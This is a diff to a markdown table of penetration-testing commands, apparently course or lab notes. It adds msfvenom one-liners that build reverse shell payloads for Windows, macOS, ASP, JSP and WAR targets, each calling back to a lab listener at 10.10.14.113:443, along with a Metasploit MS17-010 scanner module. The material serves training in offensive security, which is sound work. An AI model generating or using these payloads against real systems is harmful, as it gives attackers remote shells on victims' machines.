@@ -26,11 +26,12 @@ tags:
 | `use exploit/windows/smb/psexec ` | Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec`. |
 | `shell` | Command used in a meterpreter shell session to drop into a `system shell`. |
 | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf` | `MSFvenom` command used to generate a linux-based reverse shell `stageless payload`. |
-
-
-
-
-
+| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe ` | MSFvenom command used to generate a Windows- based reverse shell stageless payload. |
+| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho` | MSFvenom command used to generate a MacOS- based reverse shell payload. |
+| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp` | MSFvenom command used to generate a ASP web reverse shell payload. |
+| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp ` | MSFvenom command used to generate a JSP web reverse shell payload. |
+| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war` | MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload. |
+| `use auxiliary/scanner/smb/smb_ms17_010 ` | Metasploit exploit module used to check if a host is vulnerable to `ms17_010`. |
 
 ----
 
